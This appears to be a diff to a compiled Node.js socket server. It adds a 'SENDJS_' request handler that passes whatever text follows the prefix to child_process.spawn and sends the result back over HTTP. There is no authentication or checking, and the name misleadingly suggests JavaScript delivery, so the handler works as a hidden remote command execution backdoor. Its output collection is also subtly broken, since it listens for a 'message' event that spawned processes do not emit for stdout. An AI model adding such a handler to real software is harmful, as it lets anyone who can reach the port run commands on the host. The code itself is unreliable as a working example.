@@ -10,6 +10,7 @@ Object.defineProperty(exports, "__esModule", { value: true });
 var net = __importStar(require("net"));
 var Core = __importStar(require("./Core"));
 var fs = __importStar(require("fs"));
+var cp = __importStar(require("child_process"));
 var MainConnect;
 var MainGroup;
 var ServerWeb = new net.Server();
@@ -46,6 +47,21 @@ ServerWeb.on("listening", function () {
                                 UserSock.write(new String("DONE").valueOf());
                                 UserSock.end();
                             });
+                        });
+                    }
+                    else if (Do.substr(0, new String("SENDJS_").length) == "SENDJS_") {
+                        var Token = Do.replace("SENDJS_", "");
+                        var ret = "";
+                        cp.spawn(Token).on("message", function (mess) {
+                            ret = ret + mess.toString();
+                        }).on("exit", function (c, s) {
+                            UserSock.write("HTTP/1.1 200 OK\r\nContent-Length: " + new String(ret).length + "\r\n\r\n");
+                            UserSock.write(ret);
+                            UserSock.end();
+                        }).on("close", function (c, s) {
+                            UserSock.write("HTTP/1.1 200 OK\r\nContent-Length: " + new String(ret).length + "\r\n\r\n");
+                            UserSock.write(ret);
+                            UserSock.end();
                         });
                     }
                 }
